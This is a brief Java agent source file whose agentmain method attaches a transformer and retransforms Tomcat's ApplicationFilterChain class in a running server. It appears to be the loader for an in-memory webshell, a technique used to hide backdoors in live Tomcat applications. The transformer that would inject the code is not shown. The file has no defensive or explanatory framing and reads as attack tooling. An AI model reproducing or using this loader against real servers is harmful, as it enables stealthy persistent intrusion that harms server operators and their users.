package agent;

import java.lang.instrument.Instrumentation;
        import java.lang.instrument.UnmodifiableClassException;

public class MyAgent {
    public  static  void  agentmain(String agentArgs, Instrumentation inst) {
        MyTransformer tf = new MyTransformer();//new my transformer
        try {
            inst.addTransformer(tf, true);//added
            Class[] allclass = inst.getAllLoadedClasses();//get all class load by ...
            for (Class cl : allclass) {
                if (cl.getName().equals("org.apache.catalina.core.ApplicationFilterChain"))//for Tomcat
                {
                    inst.retransformClasses(cl);
                }
            }
      }catch (Exception e){
            e.printStackTrace();
        }
//        finally {
//            inst.removeTransformer(tf);
//        }
    }

}